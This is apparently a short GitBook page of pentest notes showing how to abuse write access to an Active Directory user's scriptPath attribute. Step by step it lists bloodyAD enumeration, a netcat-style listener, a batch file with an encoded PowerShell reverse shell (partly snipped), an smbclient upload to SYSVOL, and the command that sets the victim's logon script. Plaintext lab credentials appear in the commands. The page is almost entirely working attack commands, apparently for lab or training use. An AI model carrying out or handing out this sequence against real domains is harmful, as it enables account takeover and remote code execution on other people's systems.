# Write Login Script Path

{% code overflow="wrap" %}
```bash
bloodyAD -u 'steve.smith' -p 'Msmith08' -d 'grandstay.local' --host 192.168.178.187 get writable --detail
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**1. We start a listener**

{% code overflow="wrap" %}
```bash
penelope -p 4444​
```
{% endcode %}

**2. We create a malicious batch file for remote code execution**

(Use PS#3 Base64 Payload from [https://www.revshells.com/](https://www.revshells.com/) )

{% code overflow="wrap" %}
```bash
cat > update.bat << 'EOF' @echo off powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAG<SNIP>YQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA EOF​
```
{% endcode %}

**3. We upload the logon script to SYSVOL**

{% code overflow="wrap" %}
```bash
smbclient "//192.168.178.187/SYSVOL" -U 'grandstay.local/steve.smith%Msmith08' -c 'cd grandstay.local\\scripts; put update.bat update.bat'​
```
{% endcode %}

**4. We set a malicious logon script for the user**

{% code overflow="wrap" %}
```bash
bloodyAD -d grandstay.local -u steve.smith -p 'Msmith08' --host 192.168.178.187 set object chuck.wills scriptPath -v 'update.bat'​
```
{% endcode %}

**After a few Seconds we get a shell as Chuck.wills**

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
